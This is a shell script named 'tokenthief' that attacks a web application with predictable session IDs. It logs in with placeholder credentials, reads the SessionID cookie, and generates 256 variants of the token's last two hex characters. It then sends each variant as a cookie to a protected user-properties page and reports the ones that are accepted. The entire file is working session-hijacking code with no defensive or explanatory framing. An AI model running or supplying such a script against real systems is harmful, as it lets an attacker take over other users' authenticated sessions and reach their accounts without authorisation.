#!/usr/bin/env sh
#
# Makes initial request and gets sessionID
# Generates list of potential sessionID's
# Make note: Only increments least significant byte
# Sends request to protected resource
# Looks for signature on resulting HTML
#
tokenthief() {
 target=$1
 username="CHANGEME"
 passhash="CHANGEME"
 inittoken=`curl -i -s -k  \
     -X $'POST' \
     -H $'Origin: http://'$target \
     -H $'Upgrade-Insecure-Requests: 1' \
     -H $'Content-Type: application/x-www-form-urlencoded' \
     -H $'User-Agent: Mozilla/5.0' \
     -H $'Referer: http://'$target'/login.html' \
     --data-binary $'action=login&numberval=0&username='$username'&password='$passhash \
     $'http://'$target | \
       grep Set-Cookie | \
       cut -d ";" -f1 | \
       cut -d '"' -f2`
 tokengenerator() {
  # take user unput
  tokenfile=`mktemp`
  toke=$1
  tokelen=$((`echo $toke | wc -c`-1))
  strplen=$((`echo $tokelen`-2))
  tokenhead=`echo $toke | cut -c1-$strplen`
  # set array of characters
  declare -a ar1=("0" "1" "2" "3" "4" "5" "6" "7" "8" "9" "0" "A" "B" "C" "D" "E" "F")
  for x in ${ar1[@]}; do
   for y in ${ar1[@]}; do
    echo $tokenhead$x$y | tr '[:upper:]' '[:lower:]' >> $tokenfile
   done
  done
 }
 tokengenerator $inittoken
 validatetokens() {
  echo -e "\n[-]: Token list generated - Token Validation function started\n"
  for tx in $(cat $tokenfile); do
   #echo $tx ## Testing
   curlresults=`curl -i -s -k \
       -X $'GET' \
       -H $'User-Agent: Mozilla' \
       -H $'Upgrade-Insecure-Requests: 1' \
       -b $'SessionID='$tx'' \
       $'http://'$target'/sidebar.lhtml?action=view-user-properties' | \
         grep -iE "<title>(.*)<\/title>" | \
         cut -d " " -f1 | \
         cut -d ">" -f2`
   #echo $inittoken ## Testing
   #echo $curlresults ## Testing
   if [ "$tx" == "$inittoken" ]; then
    echo -e "\t[!] Initial token validated: " $tx
   fi
   if [ "$curlresults" != "Invalid" ]; then
    echo -e "\t[!] Valid token identified: " $tx
   fi
  done
  echo -e "\n[-]: Token Validation function complete\n"
  rm $tokenfile
 }
 validatetokens
} ## tokenthief 1.2.3.4:4321
tokenthief $1
